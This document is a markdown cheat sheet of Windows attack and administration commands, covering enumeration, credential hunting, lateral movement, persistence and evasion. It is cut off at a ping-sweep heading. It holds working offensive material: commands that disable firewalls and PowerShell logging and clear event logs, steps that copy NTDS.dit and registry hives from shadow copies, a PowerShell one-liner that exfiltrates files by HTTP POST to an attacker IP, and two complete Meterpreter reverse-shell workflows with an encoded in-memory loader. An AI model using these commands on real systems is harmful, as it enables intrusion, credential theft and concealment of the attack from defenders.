# WINDOWS

1. [Windows Files](#windows-files)
2. [Startup Directory](#startup-directory)
3. [Windows System Info](#windows-system-info)
4. [Windows Net Domain](#windows-net-domain)
5. [Windows Remote](#windows-remote)
6. [Windows Network](#windows-network)
7. [Windows Netsh](#windows-netsh)
8. [Windows Utility](#windows-utility)
9. [Windows Misc](#windows-misc)
10. [SysInternals](#sysinternals)
11. [Terminal Services RDP](#terminal-services-rdp)
12. [WMIC](#wmic)
13. [Powershell](#powershell)
14. [Windows Registry](#windows-registry)
15. [Windows Domain](#windows-domain)
16. [Windows Scripting](#windows-scripting)
17. [Windows Task Scheduler](#windows-task-scheduler)


## Windows Files 

```powershell
#Typically C:\Windows
%SYSTEMROOT% 
#DNS entries
%SYSTEMROOT%\System32\drivers\etc\hosts 
#Network settings
%SYSTEMROOT%\System32\drivers\etc\networks 
#User & password hashes
%SYSTEMROOT%\system32\config\SAM 
#Backup copy of SAM
%SYSTEMROOT%\repair\SAM 
#Backup copy of SAM
%SYSTEMROOT%\System32\config\RegBack\SAM 
#Application Log
%WINDIR%\system32\config\AppEvent.Evt 
#Security Log
%WINDIR%\system32\config\SecEvent.Evt 
#Startup Location
%ALLUSERSPROFILE%\Start Menu\Programs\Startup\ 
#Startup Location
%USERPROFILE%\Start Menu\Programs\Startup\ 
#Prefetch dir (EXE logs)
%SYSTEMROOT%\Prefetch 
#Checks here before a dns request is sent
%SYSTEMROOT%\system32\drivers\etc\hosts 
#Unattend.xml file which contains sensitive informations
%SYSTEMROOT%\Panther\Unattend.xml 
#Unattend.xml file which contains sensitive informations
%SYSTEMROOT%\Panther\Unattended.xml 
#Unattend.xml file which contains sensitive informations
%SYSTEMROOT%\Panther\Unattend\Unattended.xml 
#Unattend.xml file which contains sensitive informations
%SYSTEMROOT%\Panther\Unattend\Unattend.xml 
#Unattend.xml file which contains sensitive informations
%SYSTEMROOT%\System32\Sysprep\unattend.xml 
#Unattend.xml file which contains sensitive informations
%SYSTEMROOT%\System32\Sysprep\Panther\unattend.xml 
```


## Startup Directory 

###  Windows NT 6.1,6.0
```powershell
# All users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
# Specific users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
#Windows NT 5.2, 5.1, 5.0
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
#WINDOWS 9x
%SystemDrive%\wmiOWS\Start Menu\Programs\Startup
#WINDOWS NT 4.0, 3.51, 3.50
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
```


## Windows System Info
```powershell
#Get OS version
version 
#Get OS version
ver 
#Print hostname
hostname 
#print env variable
set 
#enumerates basic system info
systeminfo 
#Show services
sc query state=all 
#Show processes & services
tasklist /svc 
#Show all processes & DLLs
tasklist /m 
#Remote process listing
tasklist /S <ip> /v 
#Force process to terminate
taskkill /PID <pid> /F 
#Remote system info
systeminfo /S <ip> /U domain\user /P Pwd 
#Query remote registry, /s=all values
reg query\\<ip>\<RegDomain>\<Key> /v Value 
#Search registry for password
reg query HKLM /f password /t REG_SZ /s 
#List drives must be admin
fsutil fsinfo drives 
#Search for all PDFs
dir /a /s /b c:\'.pdf' 
#Search for patches
dir /a /b c:\windows\kb' 
#Search files for password
findstr /si 'password' .txt | '.xml |.xls 
#Directory listing of C:
tree /F /A c:\ > tree.txt 
#Save security hive to file
reg save HKLM\Security security.hive 
#Current user
echo %USERNAME% 
#View contents of a file
type <file> 
#List drivers
driverquery 
#lists process name, pid and ppid
wmic process get commandline,processid, parentprocessid /format:list 
#List Software
wmic product list brief 
#List Windows services
wmic service list brief 
#List process (like ps)
wmic process list brief 
#List StartUp applications
wmic startup list brief 
#List scheduled tasks
schtasks /query /fo LIST /v 
#Logged users
qwinsta 
```


## Windows Net Domain 
```powershell
#Hosts in current domain
net view /domain 
#Hosts in [MYDOMAIN]
net view /domain:[MYDOMAIN] 
#All users in current domain
net user /domain 
#Add user
net user <user> <pass> /add 
#Add user to Administrators
net localgroup "Administrators" <user> /add 
#Domain password policy
net accounts /domain 
#List local Admins
net localgroup "Administrators" 
#List domain groups
net group /domain 
#List users in Domain Admins
net group "Domain Admins" /domain 
#List DCs for current domain
net group "Domain Controllers" /domain 
#Current SMB shares
net share 
#Active SMB sessions
net session | find / "\\" 
#Unlock domain user account
net user <user> /ACTIVE:yes /domain 
#Change domain user password
net user <user> " newpassword " /domain 
#Share folder
net share <share> c:\share /GRANT:Everyone,FULL 
#Starts telnet, however the service must first be enabled
net start telnet 
```


## Windows Remote 

```powershell
#Remote process listing
tasklist /S <ip> /v 
#Remote systeminfo
systeminfo /S <ip> /U domain\user /P Pwd 
#Shares of remote computer
net share \\<ip> 
#Remote filesystem (IPC$)
net use \\<ip> 
#Map drive, specified credentials
net use z: \\<ip>\share <password> /user:DOMAIN\<user> 
#Unmount remote drive
net use z: /delete 
#Add registry key remotely
reg add \\<ip>\<regkey>\<value> 
#Create a remote service (space after start=)
sc \\<ip> create <service> binpath=C:\Windows\System32\x.exe start= auto 
#Copy remote folder
xcopy /s \\<ip>\dir C:\local 
#Remotely reboot machine
shutdown /m \\<ip> /r /t 0 /f 
#List drives in Powershell
wmic logicaldisk get caption 
#List drives in Powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root 
```


## Windows Network

```powershell
#IP configuration
ipconfig /all 
#Local DNS cache
ipconfig /displaydns 
#Open connections
netstat -ano 
#Netstat loop
netstat -anop tcp 1 
#LISTENING ports
netstat -an | findstr LISTENING 
#Routing table
route print 
#dns cashe
ipconfig /displaydns 
#Known MACs (ARP table)
arp -a 
#DNS Zone Xfer
nslookup, set type=any, ls -d domain > results.txt, exit 
#Domain SRV lookup ( ldap, kerberos, sip)
nslookup -type=SRV _www._tcp.url.com 
#TFTP file transfer
tftp -I <ip> GET remotefile 
```


## Windows Netsh 

```powershell
#Saved wireless profiles
netsh wlan show profiles 
#Disable firewall ('Old)
netsh firewall set opmode disable 
#Export wifi plaintext pwd
netsh wlan export profile folder=. key=clear 
#List interface IDs/MTUs
netsh interface ip show interfaces 
#Set IP
netsh interface ip set address local static <ip> <nmask> <gw> <ID> 
#Set DNS server
netsh interface ip set dns local static <ip> 
#Set interface to use DHCP
netsh interface ip set address local dhcp 
#Show firewall state
netsh firewall show state 
#Show firewall configuration
netsh firewall show config 
#Dump firewall configuration
netsh dump 
#Shows all firewall rules
netsh advfirewall firewall show rule name=all 
#Poke hole in firewall 
netsh advfirewall rule name="SQL Server" dir=in action=allow protocol=tcp localport=5555 enable=yes profile=any 
#Port Forwarding
netsh interface portproxy add v4tov4 listen port=4444 listenaddress=<thisboxIP> connectport=22 connectaddress=<T2IP> protocol=tcp 
#Turns all firewalls off, Win 7 and up
netsh advfirewall set currentprofile state off 
#Turns Current firewall off, Win 7 and up
netsh advfirewall set allprofiles state off 
```


## Windows Utility 

```powershell
#Display file contents
type <file> 
#Forceably delete all files in path
del <path>\*.* /a /s /q /f 
#Find "str"
find /I "str" <filename> 
#Line count of cmd output
<command> | find /c /v "" 
#Schedule file to run
at HH:MM <file> [args] (i.e. at 14:45 cmd /c) 
#Run file as user
runas /user:<user> "<file> [args] " 
#Restart now
restart /r /t 0 
#Removes CR & 'Z ('nix)
tr -d '\15\32' < win.txt > unix.txt 
#Native compression
makecab <file> 
#Uninstall patch
Wusa.exe /uninstall /kb:<X> 
#CLI Event Viewer
cmd.exe "wevtutil qe Application /c:40 /f:text /rd:true" 
#Local user manager
lusrmgr.msc 
#Services control panel
services.msc 
#Task manager
taskmgr.exe 
#Security policy manager
secpool.msc 
#Event viewer
eventvwr.msc 
#Sets ADS
type c:\anyfile.exe > c:\winnt\system32\calc.exe:anyfile.exe 
#executes an ADS
star c:\winnt\system32\calc.exe:anyfile.exe 
#Kill a process
Taskkill /PID <pid> /F 
#clear all logs
wevtutil el | Foreach-Object {wevtutil cl "$_"} 
#reboot
shutdown /r /t 0 
```


## Windows Misc 
```powershell
#CHANGE WINDOW SIZE (CMD/POWERSHELL)
mode 200,300                                            
#INSTALL A SOFTWARE QUIETLY
msiexec /quiet /qn /i malicious.msi
#LOCK WORKSTATION
rundll32.dll user32.dll LockWorkstation
#Port forwarding with Putty plink
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
#NATIVE WINDOWS PORT FORWARD ( * MUST BE ADMIN)
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1
#RE-ENABLE COMMAND PROMPT
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f
```


## SysInternals 

###  PSEXEC - run remote command
```powershell
###  EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS
psexec /accepteula \\<targetip> -u domain\user -p password -c -f \\<smbip>\share\file.exe 
#RUN REMOTE COMMAND WITH SPECIFIED HASH  
psexec /accepteula \\<ip> -u Domain\user -p <LM>:<NTLM> cmd.exe /c dir c:\Progra~1 
#RUN REMOTE COMMAND AS SYSTEM
psexec /accepteula \\<ip> -s cmd.exe 
```

###  ACCESSCHK - check permissions
```powershell
#Check services permissions
accesschk.exe /accepteula -uwcqv "Everyone" * 
#Check file and directory permissions
accesschk.exe /accepteula -qwsu "Everyone" C:\ 
```

###  AUTORUN - auto-starting location

```powershell
#create arn file
autoruns64.exe /accepteula -avc output.arn 
#load arn file
autoruns64.exe /accepteula output.arn 
```

###  PROCMON - MONITOR PROCESS (ADMIN)

```powershell
procmon.exe /accepteula /Quiet /Minimized /BackingFile "c:\temp\test.pml"
procmon.exe /accepteula /Terminate
```


## Terminal Services RDP 

###  Start RDP

```powershell
1. Create regfile.reg file with following line in it:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalService "fDenyTSConnections"=dword:00000000
2. reg import regfile.reg
3. net start "termservice"
4. sc config termservice start= auto
5. net start termservice

--OR--

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

###  TUNNEL RDP OUT PORT 443 (MAY NEED TO RESTART TERMINAL SERVICES)
```powershell
REG ADD "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v PortNumber /t REG_DWORD /d 443 /f
```

###  DISABLE NETWORK LEVEL AUTHENTICATION, ADD FIREWALL EXCEPTION

```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
netsh firewall set service type = remotedesktop mode = enable
```

###  IMPORT A SCHEDULE TASK FROM AN "EXPORTED TASK" XML

```powershell
schtasks.exe /create /tn MyTask /xml "C:\MyTask.xml" /f
```


## WMIC 

```powershell
#List all attributes
wmic [alias] get /? #Callable methods
wmic [alias] call /? 

###  Process attributes
wmic process list full 

#Starts wmic service
wmic startupwmic service 

#Domain and DC info
wmic ntdomain list 

#List all patches
wmic qfe 

#Execute process
wmic process call create "process name" 

#Terminate process
wmic process where name="process" call terminate 

#View logical shares
wmic logicaldisk get description,name 

#Display 32 || 64 bit
wmic cpu get DataWidth /format:list 
```

###  WMIC [ALIAS] [WHERE] [CLAUSE]

```powershell
[alias] == process, share, startup, service, nicconfig, useraccount, etc.
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc.
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method],delete
```

###  EXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS

```powershell
wmic /node:<TargetIP> /user:domain\user /password:password process call create "\\<smbIP>\share\evil.exe"
```

###  UNINSTALL SOFTWARE

###   Get software names
```powershell
wmic product get name /value 
wmic product where name="XXX" call uninstall /nointeractive
```

###  REMOTELY DETERMINE LOGGED IN USER

```powershell
wmic /node:remotecomputer computersystem get username
```

###  REMOTE PROCESS LISTING EVERY SECOND

```powershell
wmic /node:machinename process list brief /every:1
```

###  REMOTELY START RDP

```powershell
wmic /node:"machinename 4" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
```

###  LIST NUMBER OF TIMES USER HAS LOGGED ON

```powershell
wmic netlogin where (name like "%adm%") get numberoflogons
```

###  SEARCH FOR SERVICES WITH UNQUOTED PATHS TO BINARY (CMD)

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" |findstr /i /v """
```

###  VOLUME SHADOW COPY

```powershell
wmic /node:<DC IP> /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"
#If any copies already exist then exfil, otherwise create using following commands. Check output.txt for any errors
wmic /node:<DC IP> /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > C:\temp\output.txt"
wmic /node:<DC IP> /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive 2>&1 > C:\temp\output.txt"
wmic /node:<DC IP> /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1 > C:\temp\output.txt"
#Step by step instructions on room362.com for step below
- From Linux, download and run ntdsxtract and libesedb to export hashes or other domain information
a. Additional instructions found under the VSSOWN section
b. ntdsxtrac t- http://www.ntdsxtract.com
c. libesedb - http://code.google.com/p/libesedb/
```


## Powershell 

```powershell
#Start powershell
powershell.exe -nop -exec bypass 

#displays powershell version
$psversiontable.psversion 

#allows execution of any script
set-executionpolicy unrestricted 

#Stops recording
stop-transcript 

#displays file contents
get-content file 

#Shows examples of command
get-help command -examples 

#Searches for cmd string
get-command ' string ' 

#Displays services (stopservice, start-service)
get-service 

#Display powershell version
get-wmiobject -class win32_service 

#Run powershell 2.0 from 3.0
$PSVesionTable 

#Returns # of services
powershell.exe -version 2.0 #Returns 

#Returns list of PSDrives
get-service measure-object 

#Returns only names
get-psdrive 

#Cmdlets that take creds
get-process select -expandproperty name 

#Available WMI network cmds
get-help * -parameter credential 

#DNS Lookup
get-wmiobject -list *network [Net.DNS]::GetnostEntry("<ip>") 

#Hash a file
Get-FileHash <file> -Algorithm MD5 

#list process dlls
get-process -id <pid> | select -expand modules 

#Change screen buffer size
$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(160,5000) 

#file time stamps
Get-ChildItem -path C:\Windows | Select-Object name, lastaccesstime, lastwritetime, creationtime | Sort-Object -Property lastwritetime | format-table -AutoSize     

#list files changed in last 2 hours
Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) } 

$tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'  #schtasks to run

#Services
Get-wmiobject win32_service | where-object { $_.StartMode -eq 'Auto' } | format-list Name, DisplayName, PathName 

#Check event logs
get-winevent @{logname='application','security','system';starttime=[datetime]::today} | select logname, timecreated, id, message | formate-table -autosize 

#last time windows updated
get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Detect" | Select-Object lastsuccesstime 

# Windows Env variables
get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" 

#print env variable in PowerShell
gci env: 

#lists audit policies (Admin)
auditpol /get /catagory:* 

#ingest script into memory
import-module c:\windows\system32\config\mslog.ps1 
```

###  DISABLE POWERSHELL LOGGING%%

```powershell
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableTranscripting = 1   # is on
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableInvocationHeader = 1
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription OutputDirectory = “”
```

###  Check for Powershell logs

```powershell
wevtutil el
wevtutil gl "Windows Powershell"
wevtutil sl "Windows Powershell" /ms:1024000
wevtutil sl "windows Powershell" /rt:true /ab:fales
wevtutil sl "windows Powershell" /ab:false
```

###  CLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(SVRO1)

```powershell
Get-EventLog -list Clear-EventLog -logname Application, Security -computername SVR01
```

###  SEARCH FOR SERVICES WITH UNQUOTED PATHS TO BINARY (POWERSHELL)

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

###  EXPORT OS INFO INTO CSV FILE

```powershell
Get-WmiObject -class win32_operatingsystem | select -property * | export-csv c:\os.txt
```

###  LIST RUNNING SERVICES

```powershell
Get-Service | where_object {$_.status -eq "Running"}
```

###  PERSISTENT PSDRIVE TO REMOTE FILE SHARE:

```powershell
New-PSDrive -Persist -PSProvider FileSystem -Root \\1.1.1.1\tools -Name i
```

###  RETURN FILES WITH WRITE DATE PAST 8/20

```powershell
Get-Childitem -Path c:\ -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"}
```

###  FILE DOWNLOAD OVER HTTP

```powershell
(new-object system.net.webclient).downloadFile("url","dest")
```

###  TCP PORT CONNECTION (SCANNER)

```powershell
$ports=(80,443,445);$ip="10.10.10.10";foreach($port in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$port);}catch{};if($socket -eq $NULL){echo $ip":"$port"- Closed";}else{echo $ip":"$port" - Open";$socket = $NULL;}}
```

```shell
powershell.exe -Command "$ports=(80);$ip='127.0.0.1';foreach($port in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$port);}catch{};if($socket -eq $NULL){echo $ip':'$port'- Closed';}else{echo $ip':'$port' - Open';$socket = $NULL;}}"
```

###  PING WITH 500 MILLISECOND TIMEOUT

```powershell
$ping = New-Object System.Net.Networkinformation.ping
$ping.Send("<ip>",55O)
```

###  BASIC AUTHENTICATION POPUP

```powershell
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("<title>", "<message>","<user>" "<domain >")
```

###  RUN EXE EVERY 4 HOURS BETWEEN AUG 8-11 , 2013 AND THE HOURS OF 0800-1700 (FROM CMD.EXE)

```powershell
powershell.exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match '201308(0[8-9]|1[0-1])-(0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400}}while(1)"
```

###  POWERSHELL RUNAS

```powershell
$pw = convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp = new-object -typename System.Management.Automation.PSCredential -argument list "DOMAIN\user", $pw;
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process file.exe -verb runas}'
```

###  EMAIL SENDER

```powershell
powershell.exe Send-MailMessage -to "<email>" -from "<email>" -subject "Subject" -a "<attachment file path>" -body "Body" -SmtpServer <Target Email Server IP>
```

###  TURN ON POWERSHELL REMOTING (WITH VALID CREDENTIALS)

```powershell
net time \\ip
at \\ip <time> "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip <time+1> "Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts *'"
at \\ip <time+2> "Powershell -Command 'Restart-Service WinRM'"
$s1 = new-PSSession -ComputerName <ip> -Credential <username>
Enter-PSSession -session $s1
copy-item "C:\myRemoteData\Scripts" -Destination "C:\mylocaldata\Scripts" -fromSession $s1
remove-pssession $s1
```

###  LIST HOSTNAME AND IP FOR ALL DOMAIN COMPUTERS

```powershell
Get-WmiObject -ComputerName <DC> -Namespace root\microsoftDNS -Class MicrosoftDNS_ResourceRecord -Filter "domainname='<DOMAIN>'" | select textrepresentation
```

###  Encoding powershell (base64) 1

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami"))
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))
powershell.exe -encodedCommand dwBoAG8AYQBtAGkA
```

###  Encoding powershell (base64) 2

```powershell
$Text = "This is a secret and should be hidden"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
$EncodedText = "VABoAGkAcwAgAGkAcwAgAGEAIABzAGUAYwByAGUAdAAgAGEAbgBkACAAcwBoAG8AdQBsAGQAIABiAGUAIABoAGkAZABlAG4A"
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText
```

###  POWERSHELL DOWNLOAD OF A FILE FROM A SPECIFIED LOCATION

```powershell
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $source="""https://<YOUR SPECIFIED IP>/file.zip""";$destination="""C:\master.zip"""; $http = new-object System.Net.WebClient;$response = $http.DownloadFile($source, $destination);"
```

###  POWERSHELL DATA EXFIL

```powershell
#Script will send a file ($filepath) via http to server ($server) via POST
#request. Must have web server listening on port designated in the $server
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; $server="""http://<YOUR SPECIFIED IP>/<folder>""";$filepath="""C:\master.zip"""; $http=new-object System.Net.WebClient;$response = $http.UploadFile($server,$filepath);"
```

###  USING POWERSHELL TO LAUNCH METERPRETER FROM MEMORY

```powershell
#Need Metasploit v4.5+ (msfvenom supports Powershell)

#Use Powershell (x86) with 32 bit Meterpreter payloads
#encodeMeterpreter.psl script can be found on next page

--ON ATTACK BOXES--
./msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=1.1.1.1 LPORT=443 audit.ps1
#Move audit.psl into same folder as encodeMeterpreter.psl
#Launch Powershell(x86)
powershell.exe -executionpolicy bypass encodeMeterpreter.psl
#Copy the encoded Meterpreter string

--START LISTENER ON ATTACK BOX--
./msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 1.1.1.1
set LPORT 443
exploit -j

--ON TARGET (MUST USE POWERSHELL (x86))--
powershell.exe -noexit -encodedCommand <paste encoded Meterpreter string here>

--ENCODEMETERPRETER.PS1--
# Get Contents of Script
$contents = Get-Content audit.ps1
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]::Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
$contents | ForEach-Object {$sw.WriteLine($_)}
$sw.Close()
# Base64 Encode Stream
$code = [Convert]::ToBase64String($ms.ToArray())
$command= "Invoke-Expression `$(New-Object IO.StreamReader(`$(New-Object IO.Compression.DeflateStream (`$(New-Object IO.MemoryStream(,`$([Convert]::FromBase64String(`"$code`")))),[IO.Compression.CompressiontMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd();"
# Invoke-Expression $command
$bytes= [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand
```

##USING POWERSHELL TO LAUNCH METERPRETER (2ND METHOD)

```powershell
--ON ATTACK BOX--
msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=8080 R | msfencode -t psh -a x86

--ON WINDOWS ATTACK BOX--
powershell
$cmd = ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE'
$u = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$e = [Convert]::ToBase64String($u)
$e
#Copy contents of $e

--START LISTENER ON ATTACK BOX--
./msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 1.1.1.1
set LPORT 8080
exploit -j

--ON TARGET SHELL ( 1 : DOWNLOAD SHELLCODE, 2 : EXECUTE)--
powershell -noprofile -noninteractive -command "&{$client~new-object System.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt', 'c:\windows\temp\_shell.txt')}"
powershell -noprofile -noninteractive -noexit -command "&{$cmd=type 'c:\windows\temp\_shell.txt';powershell -noprofilenoninteractive -noexit -encodedCommand $cmd}"
```


## Windows Registry 

```powershell
#OS INFORMATION
HKLM\Software\Microsoft\Windows NT\CurrentVersion
#PRODUCT NAME
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName
#DATE OF INSTALL
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
#REGISTERED OWNER
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
#SYSTEM ROOT
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot
#TIME ZONE (OFFSET IN MINUTES FROM UTC)
HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTimeBias
#MAPPED NETWORK DRIVES
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU
#MOUNTED DEVICES
HKLM\System\MountedDevices
#USB DEVICES
HKLM\System\CurrentControlSet\Enum\USBStor
#TURN ON IP FORWARDING
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -> IPEnableRouter = 1
#PASSWORD KEYS : LSA SECRETS CAN CONTAIN VPN 1 AUTOLOGON 1 OTHER PASSWORDS
HKEY_LOCAL_MACHINE\Security\Policy\Secrets
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\autoadminlogon
#AUDIT POLICY
HKLM\Security\Policy\PolAdTev
#KERNEL/USER SERVICES
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
#INSTALLED SOFTWARE ON MACHINE
HKLM\Software
#INSTALLED SOFTWARE FOR USER
HKCU\Software
#RECENT DOCUMENTS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
#RECENT USER LOCATIONS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite dtmu & \Opensavetmu
#TYPED URLs
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
#MRU LISTS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
#LAST REGISTRY KEY ACCESSED
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKey
#STARTUP LOCATIONS
HKLM\Software \Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows
#INTERFACE GUID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
#IP ADDRESSES 
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\{###  INTERFACE GUID###  }\Parameters\Tcpip
#Search password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
#INSTALL MSI WITH ADMINISTRATION RIGHT
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
#Other registries which could contain passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```


## Windows Domain 

```powershell
#LIST USERS ON DOMAIN WITH NO LIMIT ON RESULTS
dsquery user -limit 0
#LIST GROUPS FOR DOMAIN=VICTIM.COM
dsquery group "cn=users, dc=victim, dc=com"
#LIST DOMAIN ADMIN ACCOUNTS
dsquery group -name "domain admins" | dsget group -members -expand
#LIST ALL GROUPS FOR A USER
dsquery user -name bob* | dsget user -memberof -expand
#GET A USER'S LOGIN ID
dsquery user -name bob* | dsget user -samid
#LIST ACCOUNTS INACTIVE FOR 2 WEEKS
dsquery user -inactive 2
#ADD DOMAIN USER
dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpass -display "Bob" -pwdneverexpires yes -memberof "CN=Domain Admins,CN=Users,DC=victim,DC=com"
#DELETE USER
dsrm -subtree -noprompt "CN=Bob,CN=Users,DC=victim,DC=com"
#LIST ALL OPERATING SYSTEMS ON DOMAIN
dsquery A "DC=victim,DC=com" -scope subtree -attr "cn" "operatingSystem" "operatingSystemServicePack" -filter "(&(objectclass=computer)(objectcategory=computer)(operatingSystem=Windows*))"
#LIST ALL SITE NAMES
dsquery site -o rdn -limit 0
#LIST ALL SUBNETS WITHIN A SITE
dsquery subnet -site <sitename> -o rdn
#LIST ALL SERVERS WITHIN A SITE
dsquery server -site <sitename> -o rdn
#FIND SERVERS IN THE DOMAIN
dsquery * domainroot -filter "(&(objectCategory=Computer) (objectClass=Computer) (operatingSystem=Server))" -limit 0
#DOMAIN CONTROLLERS PER SITE
dsquery * "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter (objectCategory=Server)
```

## Windows Scripting 

```powershell
#If scripting in batch file, variables must be preceeded with %%, i.e. %%i
```

###  NESTED FOR LOOP PING SWEEP

```powershell
